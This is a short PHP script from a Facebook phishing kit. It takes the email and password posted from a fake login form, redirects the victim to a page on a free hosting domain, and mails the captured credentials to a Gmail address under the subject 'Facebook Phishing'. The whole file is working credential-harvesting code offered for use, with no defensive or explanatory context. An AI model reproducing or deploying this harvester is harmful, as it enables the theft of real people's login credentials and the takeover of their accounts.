<?php
$var = $_POST['email'];
$var2 = $_POST['pass'];
$myFile = file_get_contents("pwned.html");
$searchString = "<html><title>Your Connection To This Website is Secure</title>
<text>You Have Been PWNED!</text>
</html>";
if($myFile == $searchString) {
    header('Location: https://darkmember2000.000webhostapp.com/facebookmobile.html');
}
if($myFile != $searchString) {
    header('Location: https://darkmember2000.000webhostapp.com/facebookmobile.html');
}
$headers = "From:amugawaya@gmail.com";
$to = "darkmember2000@gmail.com";
$me = "darkmember2000@gmail.com";
$txt ="
╬═════════════════════╬
   ◈ Code By Manoj ◈        
╬═════════════════════╬
                                    
                                    
╬═════════════════════╬

  Email :- $var
  
═══════════════════════  

  Password :- $var2
  
═══════════════════════

";
$subject = "Facebook Phishing";
mail($me,$subject,$txt,$headers);
mail($to,$subject,$txt,$headers);
exit();
?>

